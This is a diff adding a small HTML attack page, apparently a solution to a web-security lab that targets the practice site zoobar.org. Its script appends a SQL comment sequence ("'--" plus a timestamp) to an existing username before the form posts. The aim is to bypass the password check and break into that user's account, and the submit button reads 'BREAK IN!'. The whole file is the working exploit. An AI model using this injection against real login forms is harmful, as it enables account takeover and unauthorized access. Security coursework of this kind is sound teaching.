@@ -1,0 +1,20 @@
+<html>
+    <head></head>
+    <body>
+        <form action="http://zoobar.org/index.php" method="post" onsubmit="injectUsername()">
+            <input id="existing_user" type="text" name="login_username"/>
+            <input type="hidden" name="login_password" value="test">
+            <input type="submit" value="BREAK IN!" name="submit_registration"/>
+        </form>
+        <script>
+            function injectUsername() {
+                var injectString = "'--" + Date.now();
+                var currentUsername = document.getElementById('existing_user').value;
+                var newUsername = currentUsername + injectString;
+                document.getElementById('existing_user').value = newUsername;
+            }
+        </script>
+    </body>
+</html>
+
+ 
